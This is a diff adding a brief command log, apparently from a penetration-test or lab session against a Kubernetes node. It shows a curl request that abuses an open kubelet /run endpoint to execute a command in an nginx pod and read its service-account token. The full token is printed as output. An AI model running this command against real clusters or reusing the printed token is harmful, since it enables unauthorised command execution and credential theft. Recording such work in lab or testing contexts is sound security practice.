@@ -1,0 +1,10 @@
+### [2026-04-05 10:49:36] curl -k -X POST https://10.129.96.167:10250/run/default/nginx/nginx -d cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+$ curl -k -X POST https://10.129.96.167:10250/run/default/nginx/nginx -d cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+  0      0   0      0   0      0      0      0                              0100   1051 100    992 100     59   7695    457                              0100   1051 100    992 100     59   7692    457                              0100   1051 100    992 100     59   7689    457                              0
+eyJhbGciOiJSUzI1NiIsImtpZCI6Ik5scHZ2eDdQNFlhOXhDNXVXRVdYTUExbUprYUFKcjB6dEJWYTBPSkZaNTgifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxODA2ODkxNzAwLCJpYXQiOjE3NzUzNTU3MDAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjAyMWU1YTc5LTc1NmMtNGMwMS1iNjEyLTdkMWNjNGViZDI0YiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImVjYTdmNGM2LWZmNWItNDE4NC1hMTE0LTk3MzIxNmM3OTQ2MCJ9LCJ3YXJuYWZ0ZXIiOjE3NzUzNTkzMDd9LCJuYmYiOjE3NzUzNTU3MDAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.LBjsaohknTIRqQ9MVhTItgPciDLJ1b8p0Sm5GgWDLq126sFmGeErSnYIHxDSzDlpA5giC4F3en-Txa0ZWKNpJkPWQcrl6qsuIZ4oKJF6LtONoUlH8Osr3ni8V28ooRvRLgxM1-tGM5WvEIKyrZHlZy2RsuYLXFyd5XPtW9ZX4DpO7wUVJluYQBYInVpmuhdqR4uNT0pNkaEL_Tqyb12KMUqdXa1zzBo_dJ4LVYRmgWOasppBIIz8ICr6t1vYFVHLQTkaFX7kVE9wD91E1Zd-dreWktbFiNKYc-acY79X9fkRnQ-HnID4g7SKmtJyjsYF1pcVzpf-dL-SKfaPUkasEA
+# Exit code: 0
+# Duration: 2026-04-05 10:49:36
